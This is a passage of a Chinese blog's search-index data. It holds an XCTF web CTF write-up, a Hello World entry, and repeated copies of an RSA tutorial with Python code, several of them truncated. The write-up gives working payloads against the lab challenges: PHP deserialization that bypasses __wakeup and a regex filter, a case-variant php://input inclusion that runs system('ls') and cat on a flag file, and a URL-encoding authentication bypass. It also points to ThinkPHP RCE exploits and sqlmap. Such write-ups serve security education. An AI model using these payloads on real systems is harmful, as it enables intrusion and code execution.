xxxxxxx \u003c/p\u003e\"; } ?\u003e Can you anthenticate to this website? 构造id=%2561dmin使之在被两次urldecode后等于admin就可获得flag。 ","date":"2022-01-18","objectID":"/articles/XCTF-WEB-1/:0:4","series":null,"tags":null,"title":"攻防世界web前11题WP","uri":"/articles/XCTF-WEB-1/#php2"},{"categories":["CTF-WEB"],"content":" Web_php_unserialize又是一道反序列化的题。打开网页发现源代码。 \u003c?php class Demo { private $file = 'index.php'; public function __construct($file) { //构造函数，赋值给file $this-\u003efile = $file; } function __destruct() { //析构函数 echo @highlight_file($this-\u003efile, true); } function __wakeup() { if ($this-\u003efile != 'index.php') { //the secret is in the fl4g.php $this-\u003efile = 'index.php'; } } } if (isset($_GET['var'])) { $var = base64_decode($_GET['var']); if (preg_match('/[oc]:\\d+:/i', $var)) { // /i的意思是不区分大小写 die('stop hacking!'); } else { @unserialize($var); } } else { highlight_file(\"index.php\"); } ?\u003e 当Demo被反序列化时，wakeup函数中的内容会被执行，通过构造类中成员属性数目大于实际数目绕过。 var=O:4:\"Demo\":2:{s:10:\"\\0Demo\\0file\";s:8:\"fl4g.php\";} 下面是对var变量的检查，用到了正则表达式，如果var符合开头o:数字的形式就会被过滤，这里采用+号过滤。 构造var=O:+4:\"Demo\":2:{s:10:\"\\0Demo\\0file\";s:8:\"fl4g.php\";}，再进行一次base64加密，构造payload传参即可得到flag。 注意Demofile中的\\0，最好直接复制序列化之后的结果来改，不然特殊字符很容易出问题。 ","date":"2022-01-18","objectID":"/articles/XCTF-WEB-1/:0:5","series":null,"tags":null,"title":"攻防世界web前11题WP","uri":"/articles/XCTF-WEB-1/#web_php_unserialize"},{"categories":["CTF-WEB"],"content":" php_rce打开以后发现是个Thinkphp V5的介绍页面，说明要利用Thinkphp框架的漏洞。查阅kali linux自带的漏洞数据库即可获得hack的方法。 使用`searchsploit thinkphp``命令即可查询到可利用的漏洞。 然后远程代码执行，找到flag文件。 ","date":"2022-01-18","objectID":"/articles/XCTF-WEB-1/:0:6","series":null,"tags":null,"title":"攻防世界web前11题WP","uri":"/articles/XCTF-WEB-1/#php_rce"},{"categories":["CTF-WEB"],"content":" Web_php_include看题目应该是个文件包含。打开页面出一段代码。 \u003c?php show_source(__FILE__); echo $_GET['hello']; $page=$_GET['page']; while (strstr($page, \"php://\")) { $page=str_replace(\"php://\", \"\", $page); } include($page); ?\u003e 阅读代码发现，题目简单过滤了\"php://“利用php大小写不敏感的特性，构造大写的pHp://绕过过滤。 使用php://input协议，远程执行代码： \u003c?php system(\"ls\"); ?\u003e 和 \u003c?php system(\"cat fl4gisisish3r3.php\"); ?\u003e 获取flag。 ","date":"2022-01-18","objectID":"/articles/XCTF-WEB-1/:0:7","series":null,"tags":null,"title":"攻防世界web前11题WP","uri":"/articles/XCTF-WEB-1/#web_php_include"},{"categories":["CTF-WEB"],"content":" ics-06签到。Burpsuite暴力跑字典破解。。。 ","date":"2022-01-18","objectID":"/articles/XCTF-WEB-1/:0:8","series":null,"tags":null,"title":"攻防世界web前11题WP","uri":"/articles/XCTF-WEB-1/#ics-06"},{"categories":["CTF-WEB"],"content":" NewsCenter注意到网站使用的Sql数据库，使用Sqlmap工具hack。 sqlmap使用教程 ","date":"2022-01-18","objectID":"/articles/XCTF-WEB-1/:0:9","series":null,"tags":null,"title":"攻防世界web前11题WP","uri":"/articles/XCTF-WEB-1/#newscenter"},{"categories":["CTF-WEB"],"content":" NaNNaNNaNNaN-Batman下载到一段代码： function $(){ var e=document.getElementById(\"c\").value; if(e.length==16) if(e.match(/^be0f23/)!=null) if(e.match(/233ac/)!=null) if(e.match(/e98aa$/)!=null){ if(e.match(/c7be9/)!=null){ var t=[\"fl\",\"s_a\",\"i\",\"e}\"]; var n=[\"a\",\"_h0l\",\"n\"]; var r=[\"g{\",\"e\",\"_0\"]; var i=[\"it'\",\"_\",\"n\"]; var s=[t,n,r,i]; for(var o=0;o\u003c13;++o){ document.write(s[o%4][0]);s[o%4].splice(0,1) } } } } js正则表达式审计，但其实可以直接把前面判断的代码删掉，再跑一下生成flag的那段获取flag。 ","date":"2022-01-18","objectID":"/articles/XCTF-WEB-1/:0:10","series":null,"tags":null,"title":"攻防世界web前11题WP","uri":"/articles/XCTF-WEB-1/#nannannannan-batman"},{"categories":["CTF-WEB"],"content":" unserialize3又一道反序列化，打开页面得到代码： class xctf{ public $flag = '111'; public function __wakeup(){ exit('bad requests'); } ?code= 这题和上道反序列化题相比完全是两个级别，直接将给的代码反序列化后，绕过wake_up即可得到flag。 ","date":"2022-01-18","objectID":"/articles/XCTF-WEB-1/:0:11","series":null,"tags":null,"title":"攻防世界web前11题WP","uri":"/articles/XCTF-WEB-1/#unserialize3"},{"categories":["Hello World"],"content":"$$ Hello World! $$ ","date":"2022-01-18","objectID":"/articles/hello-world/:0:0","series":null,"tags":null,"title":"HelloWorld","uri":"/articles/hello-world/#"},{"categories":null,"content":"前置知识：欧拉定理 进阶知识：Miller Rabin算法（用于生成大素数），蒙哥马利算法（用于加快大数相乘再取模运算） 引入历史上常规的密码加解密算法的流程如下： 假设甲要给乙发送数据，则需要甲通过一定的加密规则将数据加密，传送给乙，乙再通过一定的解密规则进行解密。 由于可靠性高的密码算法都要公开自己的加解密算法，因此，在数据传输的过程中，密钥的传输成了一个大难题。 因此RSA算法将密钥分为公钥和私钥两个部分，公钥任何人都可以获取到，而私钥只有数据接收方知道，接下来我们看看RSA加解密算法的运作流程。 算法流程 选定两个素数\\(p\\),\\(q\\),令\\(n=pq,\\phi{(n)}=(p-1)(q-1)\\) 选取一个公钥\\(e\\)，满足\\(1\u003ce\u003c\\phi{(n)}\\)，且\\(e\\)与\\(\\phi{(n)}\\)互质 生成私钥 \\(d\\)，满足\\(ed\\equiv1(mod\\ \\phi{(n)})\\) 假设要发送的信息为\\(m\\)，则加解密规则成立： $$ m^e\\equiv c\\pmod{n}\\ c^d\\equiv m\\pmod{n} $$ 可靠性分析考虑甲向乙发送一串数据，乙只需要向甲传送\\(n\\)和\\(e\\),甲就可以将加密完成的\\(c\\)发还给乙，由乙来进行解密操作。 考虑第三方攻击者，只可能截获\\(n\\),\\(e\\),\\(c\\)，若要获取私钥\\(d\\)，则必须计算得\\(n\\)分解成的\\(p\\),\\(q\\)两数。 而大质数的因式分解所需要的运算量是非常恐怖的。因此，当选定的\\(n\\)很大时，RSA算法几乎不可能被破解。 总而言之：RSA利用的是，大数容易相乘，难以分解的特性，使得算法可靠。 代码实现 #RSA加解密算法实现 @copyright zeroy p=1000000007 q=998244353 n=p*q phi_n=(p-1)*(q-1) E=65537 def qkpow(a,b): ans=1 while b\u003e0: if b%2==1: ans=ans*a%n a=a*a%n b=b//2 return ans def exgcd(a,b): if b==0: return 1,0,a else: x,y,q=exgcd(b,a%b) x,y=y,(x-(a//b)*y) return x,y,q # E**D=1(mod phi_n) def calcD(): x,y,q=exgcd(E,phi_n) return x+phi_n D=calcD() # C=m**E%n def encode(m): c=qkpow(m,E) return c # ans=c**D%n def decode(c): return qkpow(c,D) def main(): c=encode(234234) ans=decode(c) print(ans) main() 正确性证明RSA算法过程以及正确性证明 - 简书 (jianshu.com) 拓展知识我们已经知道了RSA算法的流程，也知道了它的正确性，但是还有几个问题需要解决。 既然大数分解十分困难，那我们该如何寻找两个大质数来作为\\(p\\),\\(q\\)呢？ 加解密运算中涉及到了大量的大数乘法取模，这是运算复杂度最高的部分，有没有一种方法可以优化\\(AB\\equiv C(mod\\ N)\\)运算的速度从而优化密钥生成的速度？ 方法是有的。可以采用Miller Rabin算法来对生成的大数进行质数检验，用蒙哥马利算法来优化大数相乘的复杂度，不过这不属于本文的主题，感兴趣的师傅可以自行了解。 ","date":"0001-01-01","objectID":"/rsa%E7%AE%97%E6%B3%95%E8%AF%A6%E8%A7%A3/:0:0","series":null,"tags":null,"title":"","uri":"/rsa%E7%AE%97%E6%B3%95%E8%AF%A6%E8%A7%A3/#"},{"categories":null,"content":"前置知识：欧拉定理 进阶知识：Miller Rabin算法（用于生成大素数），蒙哥马利算法（用于加快大数相乘再取模运算） 引入历史上常规的密码加解密算法的流程如下： 假设甲要给乙发送数据，则需要甲通过一定的加密规则将数据加密，传送给乙，乙再通过一定的解密规则进行解密。 由于可靠性高的密码算法都要公开自己的加解密算法，因此，在数据传输的过程中，密钥的传输成了一个大难题。 因此RSA算法将密钥分为公钥和私钥两个部分，公钥任何人都可以获取到，而私钥只有数据接收方知道，接下来我们看看RSA加解密算法的运作流程。 算法流程 选定两个素数\\(p\\),\\(q\\),令\\(n=pq,\\phi{(n)}=(p-1)(q-1)\\) 选取一个公钥\\(e\\)，满足\\(1","date":"0001-01-01","objectID":"/rsa%E7%AE%97%E6%B3%95%E8%AF%A6%E8%A7%A3/:0:0","series":null,"tags":null,"title":"","uri":"/rsa%E7%AE%97%E6%B3%95%E8%AF%A6%E8%A7%A3/#引入"},{"categories":null,"content":"前置知识：欧拉定理 进阶知识：Miller Rabin算法（用于生成大素数），蒙哥马利算法（用于加快大数相乘再取模运算） 引入历史上常规的密码加解密算法的流程如下： 假设甲要给乙发送数据，则需要甲通过一定的加密规则将数据加密，传送给乙，乙再通过一定的解密规则进行解密。 由于可靠性高的密码算法都要公开自己的加解密算法，因此，在数据传输的过程中，密钥的传输成了一个大难题。 因此RSA算法将密钥分为公钥和私钥两个部分，公钥任何人都可以获取到，而私钥只有数据接收方知道，接下来我们看看RSA加解密算法的运作流程。 算法流程 选定两个素数\\(p\\),\\(q\\),令\\(n=pq,\\phi{(n)}=(p-1)(q-1)\\) 选取一个公钥\\(e\\)，满足\\(1","date":"0001-01-01","objectID":"/rsa%E7%AE%97%E6%B3%95%E8%AF%A6%E8%A7%A3/:0:0","series":null,"tags":null,"title":"","uri":"/rsa%E7%AE%97%E6%B3%95%E8%AF%A6%E8%A7%A3/#算法流程"},{"categories":null,"content":"前置知识：欧拉定理 进阶知识：Miller Rabin算法（用于生成大素数），蒙哥马利算法（用于加快大数相乘再取模运算） 引入历史上常规的密码加解密算法的流程如下： 假设甲要给乙发送数据，则需要甲通过一定的加密规则将数据加密，传送给乙，乙再通过一定的解密规则进行解密。 由于可靠性高的密码算法都要公开自己的加解密算法，因此，在数据传输的过程中，密钥的传输成了一个大难题。 因此RSA算法将密钥分为公钥和私钥两个部分，公钥任何人都可以获取到，而私钥只有数据接收方知道，接下来我们看看RSA加解密算法的运作流程。 算法流程 选定两个素数\\(p\\),\\(q\\),令\\(n=pq,\\phi{(n)}=(p-1)(q-1)\\) 选取一个公钥\\(e\\)，满足\\(1","date":"0001-01-01","objectID":"/rsa%E7%AE%97%E6%B3%95%E8%AF%A6%E8%A7%A3/:0:0","series":null,"tags":null,"title":"","uri":"/rsa%E7%AE%97%E6%B3%95%E8%AF%A6%E8%A7%A3/#可靠性分析"},{"categories":null,"content":"前置知识：欧拉定理 进阶知识：Miller Rabin算法（用于生成大素数），蒙哥马利算法（用于加快大数相乘再取模运算） 引入历史上常规的密码加解密算法的流程如下： 假设甲要给乙发送数据，则需要甲通过一定的加密规则将数据加密，传送给乙，乙再通过一定的解密规则进行解密。 由于可靠性高的密码算法都要公开自己的加解密算法，因此，在数据传输的过程中，密钥的传输成了一个大难题。 因此RSA算法将密钥分为公钥和私钥两个部分，公钥任何人都可以获取到，而私钥只有数据接收方知道，接下来我们看看RSA加解密算法的运作流程。 算法流程 选定两个素数\\(p\\),\\(q\\),令\\(n=pq,\\phi{(n)}=(p-1)(q-1)\\) 选取一个公钥\\(e\\)，满足\\(1","date":"0001-01-01","objectID":"/rsa%E7%AE%97%E6%B3%95%E8%AF%A6%E8%A7%A3/:0:0","series":null,"tags":null,"title":"","uri":"/rsa%E7%AE%97%E6%B3%95%E8%AF%A6%E8%A7%A3/#代码实现"},{"categories":null,"content":"前置知识：欧拉定理 进阶知识：Miller Rabin算法（用于生成大素数），蒙哥马利算法（用于加快大数相乘再取模运算） 引入历史上常规的密码加解密算法的流程如下： 假设甲要给乙发送数据，则需要甲通过一定的加密规则将数据加密，传送给乙，乙再通过一定的解密规则进行解密。 由于可靠性高的密码算法都要公开自己的加解密算法，因此，在数据传输的过程中，密钥的传输成了一个大难题。 因此RSA算法将密钥分为公钥和私钥两个部分，公钥任何人都可以获取到，而私钥只有数据接收方知道，接下来我们看看RSA加解密算法的运作流程。 算法流程 选定两个素数\\(p\\),\\(q\\),令\\(n=pq,\\phi{(n)}=(p-1)(q-1)\\) 选取一个公钥\\(e\\)，满足\\(1","date":"0001-01-01","objectID":"/rsa%E7%AE%97%E6%B3%95%E8%AF%A6%E8%A7%A3/:0:0","series":null,"tags":null,"title":"","uri":"/rsa%E7%AE%97%E6%B3%95%E8%AF%A6%E8%A7%A3/#正确性证明"},{"categories":null,"content":"前置知识：欧拉定理 进阶知识：Miller Rabin算法（用于生成大素数），蒙哥马利算法（用于加快大数相乘再取模运算） 引入历史上常规的密码加解密算法的流程如下： 假设甲要给乙发送数据，则需要甲通过一定的加密规则将数据加密，传送给乙，乙再通过一定的解密规则进行解密。 由于可靠性高的密码算法都要公开自己的加解密算法，因此，在数据传输的过程中，密钥的传输成了一个大难题。 因此RSA算法将密钥分为公钥和私钥两个部分，公钥任何人都可以获取到，而私钥只有数据接收方知道，接下来我们看看RSA加解密算法的运作流程。 算法流程 选定两个素数\\(p\\),\\(q\\),令\\(n=pq,\\phi{(n)}=(p-1)(q-1)\\) 选取一个公钥\\(e\\)，满足\\(1","date":"0001-01-01","objectID":"/rsa%E7%AE%97%E6%B3%95%E8%AF%A6%E8%A7%A3/:0:0","series":null,"tags":null,"title":"","uri":"/rsa%E7%AE%97%E6%B3%95%E8%AF%A6%E8%A7%A3/#拓展知识"}]